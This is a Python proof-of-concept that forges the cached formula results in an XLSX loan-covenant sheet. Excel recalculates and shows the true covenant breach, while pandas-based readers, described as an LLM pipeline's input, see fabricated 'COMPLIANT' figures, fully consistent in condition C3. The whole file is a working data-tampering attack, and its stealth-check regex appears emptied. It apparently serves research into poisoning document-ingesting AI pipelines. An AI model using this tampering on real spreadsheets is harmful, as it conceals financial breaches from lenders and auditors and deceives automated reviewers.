"""
Lying Spreadsheets II -- cached-value spoofing PoC.

XLSX stores each formula cell as both a formula and a cached result (<v>).
Excel recalculates on open; headless readers return the cache verbatim.
`pandas.read_excel` (default) and `openpyxl(data_only=True)` both surface the
cached value. Tampering is a single XML edit per cell: replace the cell's
<v>...</v> with a fabricated value and leave the formula intact.

    human (Excel)      -> recalculates the formula  -> TRUE value
    pipeline (pandas)  -> reads the fabricated cache -> ATTACKER value

Run:
    python poc/lying_xlsx.py
"""
from __future__ import annotations

import os
import re
import shutil
import zipfile

import openpyxl
import pandas as pd

# Raw inputs the human also sees (non-formula cells). The covenant rule is
# Debt/EBITDA <= 3.0x; the true state is 380/100 = 3.8x => BREACH.
INPUTS = {"Total Debt": 380, "Operating Income": 90, "D&A": 10, "Covenant Max": 3.0}

ROWS = [
    ("Q4 2025 Leverage Covenant", None),
    ("Total Debt ($M)", 380),               # B2 input
    ("Operating Income ($M)", "=D3"),       # B3 formula (-> raw D3=90)
    ("D&A ($M)", 10),                       # B4 input
    ("EBITDA ($M)", "=B3+B4"),              # B5 formula -> 100
    ("Covenant Max Debt/EBITDA", 3.0),      # B6 input
    ("Debt / EBITDA (x)", "=B2/B5"),        # B7 formula -> 3.8
    ("Headroom (x)", "=B6-B7"),             # B8 formula -> -0.8
    ("Covenant Status", '=IF(B7<=B6,"COMPLIANT","BREACH")'),  # B9 -> BREACH
]

# Tamper conditions. Each maps a cell ref to (fabricated_value, is_text).
CONDITIONS = {
    # C0 control: inject the TRUE caches (simulates an Excel-saved file).
    "C0": {"B5": ("100", False), "B7": ("3.8", False), "B8": ("-0.8", False), "B9": ("BREACH", True)},
    # C1: fake ratio/status only -> table is internally inconsistent (380/100 != 2.5).
    "C1": {"B5": ("100", False), "B7": ("2.5", False), "B8": ("0.5", False), "B9": ("COMPLIANT", True)},
    # C2: also fake EBITDA -> ratio ties but EBITDA != OpInc + D&A.
    "C2": {"B5": ("160", False), "B7": ("2.375", False), "B8": ("0.625", False), "B9": ("COMPLIANT", True)},
    # C3: fully consistent -> every cross-foot ties (142+10=152, 380/152=2.5).
    "C3": {"B3": ("142", False), "B5": ("152", False), "B7": ("2.5", False), "B8": ("0.5", False), "B9": ("COMPLIANT", True)},
}


def build_covenant(path: str) -> str:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Covenant"
    for i, (label, val) in enumerate(ROWS, start=1):
        ws.cell(row=i, column=1, value=label)
        if val is not None:
            ws.cell(row=i, column=2, value=val)
    ws["D3"] = 90  # off-screen raw input for Operating Income
    wb.save(path)
    return path


def tamper(src: str, dst: str, edits: dict) -> str:
    """Inject fabricated cached <v> values directly into the sheet XML."""
    tmp = dst + "_unz"
    shutil.rmtree(tmp, ignore_errors=True)
    with zipfile.ZipFile(src) as z:
        z.extractall(tmp)
    sheet = os.path.join(tmp, "xl", "worksheets", "sheet1.xml")
    with open(sheet, encoding="utf-8") as fh:
        xml = fh.read()
    for ref, (fake, is_text) in edits.items():
        cell = re.search(rf'<c r="{ref}"[^>]*>.*?</c>', xml).group(0)
        new = re.sub(r"<v\s*/>|<v>.*?</v>", "", cell)    # strip any existing cache (incl. self-closing <v/>)
        if is_text and 't="str"' not in new:
            new = new.replace(f'<c r="{ref}"', f'<c r="{ref}" t="str"')
        new = new.replace("</c>", f"<v>{fake}</v></c>")  # inject fabricated cache
        xml = xml.replace(cell, new)
    with open(sheet, "w", encoding="utf-8") as fh:
        fh.write(xml)
    if os.path.exists(dst):
        os.remove(dst)
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(tmp):
            for f in files:
                full = os.path.join(root, f)
                z.write(full, os.path.relpath(full, tmp))
    shutil.rmtree(tmp, ignore_errors=True)
    return dst


def pandas_read(path: str) -> dict:
    """What the LLM pipeline ingests."""
    df = pd.read_excel(path, header=None, usecols=[0, 1], names=["Item", "Value"]).dropna(how="all")
    return {str(r.Item): r.Value for r in df.itertuples() if str(r.Item) != "Q4 2025 Leverage Covenant"}


def ground_truth() -> dict:
    """What a human sees in Excel after recalculation (from raw inputs)."""
    ebitda = INPUTS["Operating Income"] + INPUTS["D&A"]
    ratio = INPUTS["Total Debt"] / ebitda
    status = "COMPLIANT" if ratio <= INPUTS["Covenant Max"] else "BREACH"
    return {"EBITDA": ebitda, "Debt/EBITDA": round(ratio, 3), "Status": status}


def has_stealth_tells(path: str) -> dict:
    z = zipfile.ZipFile(path)
    names = z.namelist()
    fonts = [n for n in names if n.endswith((".odttf", ".ttf"))]
    pua = len(re.findall(r"[-]", z.read("xl/worksheets/sheet1.xml").decode("utf-8", "replace")))
    return {"embedded_fonts": len(fonts), "pua_chars": pua, "parts": len(names)}


def main() -> None:
    build_covenant("_cov_base.xlsx")
    truth = ground_truth()
    print(f"HUMAN view (Excel recalculation) = {truth}\n")
    for name, edits in CONDITIONS.items():
        path = tamper("_cov_base.xlsx", f"_cov_{name}.xlsx", edits)
        m = pandas_read(path)
        ratio = m.get("Debt / EBITDA (x)")
        status = m.get("Covenant Status")
        print(f"{name}: pandas reads ratio={ratio} status={status!r:12} | tells={has_stealth_tells(path)}")
    for f in ["_cov_base.xlsx", "_cov_C0.xlsx", "_cov_C1.xlsx", "_cov_C2.xlsx", "_cov_C3.xlsx"]:
        if os.path.exists(f):
            os.remove(f)


if __name__ == "__main__":
    main()
